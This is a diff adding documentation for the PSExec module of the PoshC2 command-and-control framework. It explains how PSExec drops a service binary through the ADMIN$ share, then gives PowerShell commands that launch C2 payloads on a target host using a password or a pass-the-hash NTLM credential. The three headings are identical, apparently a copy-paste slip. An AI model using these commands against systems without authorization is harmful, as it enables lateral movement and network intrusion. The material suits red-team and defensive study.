@@ -1,5 +1,41 @@
+
 #################
   PSEXEC
 #################
 
+-----------------
+Introduction
+-----------------
+PSExec was first developed by Mark Russinovich as part of Sysinternals Suite of tools. When run it connects to the target system over SMB in order to use a hidden share called ADMIN$. This share is mapped to the Windows directory and PSExec is able to copy a service binary over. It is then able to communicate with the Service Controller of the target system using SMB in order to start the start that has been dropped. Needless to say this requires a high level of privilege and has been around for approx 20 years so many AV engines look for this behaviour. The PoshC2 version uses the `Invoke theHash <https://github.com/Kevin-Robertson/Invoke-TheHash>`_  library from `Kevin Robertson <https://twitter.com/kevin_robertson>`_ developer of Inveigh. 
 
+-----------------
+Syntax
+-----------------
+
+**PSExec using the normal comms method back to the C2**
+
+.. code-block:: powershell
+
+	Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
+
+**PSExec using the normal comms method back to the C2**
+
+.. code-block:: powershell
+
+	Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
+
+**PSExec using the normal comms method back to the C2**
+
+.. code-block:: powershell
+
+	Invoke-PsExecDiasyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
+
+-----------------
+Parameters
+-----------------
+
+- **-Target** the IP of the machine to be targeted 
+- **-Domain** Domain of user account to be used to exec payload
+- **-User** Username
+- **-Pass** Password 
+- **-Hash (Optional)** The NTLM hash (in LM:NTLM or NTLM format) to be used as authentication instead of -Domain, -User and -pass
